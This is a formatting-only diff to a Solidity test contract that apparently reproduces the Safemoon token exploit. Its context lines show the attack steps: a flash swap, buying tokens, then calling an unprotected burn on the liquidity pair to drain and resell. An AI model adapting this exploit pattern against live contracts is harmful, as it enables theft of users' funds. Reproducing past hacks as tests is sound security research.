@@ -17,7 +17,9 @@ interface ISafemoon {
 
     function approve(address spender, uint256 amount) external;
 
-    function balanceOf(address account) external view returns (uint256);
+    function balanceOf(
+        address account
+    ) external view returns (uint256);
 
     function mint(address user, uint256 amount) external;
 
@@ -35,7 +37,9 @@ interface ISafeSwapTradeRouter {
 
     function getSwapFees(uint256 amountIn, address[] memory path) external view returns (uint256 _fees);
 
-    function swapExactTokensForTokensWithFeeAmount(Trade calldata trade) external payable;
+    function swapExactTokensForTokensWithFeeAmount(
+        Trade calldata trade
+    ) external payable;
 }
 
 interface IWETH {
@@ -43,7 +47,9 @@ interface IWETH {
 
     function transfer(address, uint256) external returns (bool);
 
-    function balanceOf(address) external view returns (uint256);
+    function balanceOf(
+        address
+    ) external view returns (uint256);
 }
 
 interface IPancakePair {
@@ -99,7 +105,9 @@ contract SafemoonAttackerTest is Test, IPancakeCallee {
         assertEq(currentBalance, 27_463_848_254_806_782_408_231);
     }
 
-    function doBurnHack(uint256 amount) public {
+    function doBurnHack(
+        uint256 amount
+    ) public {
         swappingBnbForTokens(amount);
         sfmoon.burn(sfmoon.uniswapV2Pair(), sfmoon.balanceOf(sfmoon.uniswapV2Pair()) - 1_000_000_000);
         sfmoon.burn(address(sfmoon), sfmoon.balanceOf(address(sfmoon)));
@@ -115,7 +123,9 @@ contract SafemoonAttackerTest is Test, IPancakeCallee {
         weth.transfer(msg.sender, (amount0 * 10_030) / 10_000);
     }
 
-    function swappingBnbForTokens(uint256 tokenAmount) private {
+    function swappingBnbForTokens(
+        uint256 tokenAmount
+    ) private {
         address[] memory path = new address[](2);
         path[0] = address(weth);
         path[1] = address(sfmoon);
@@ -134,7 +144,9 @@ contract SafemoonAttackerTest is Test, IPancakeCallee {
         tradeRouter.swapExactTokensForTokensWithFeeAmount{value: feeAmount}(trade);
     }
 
-    function swappingTokensForBnb(uint256 tokenAmount) private {
+    function swappingTokensForBnb(
+        uint256 tokenAmount
+    ) private {
         address[] memory path = new address[](2);
         path[0] = address(sfmoon);
         path[1] = address(weth);
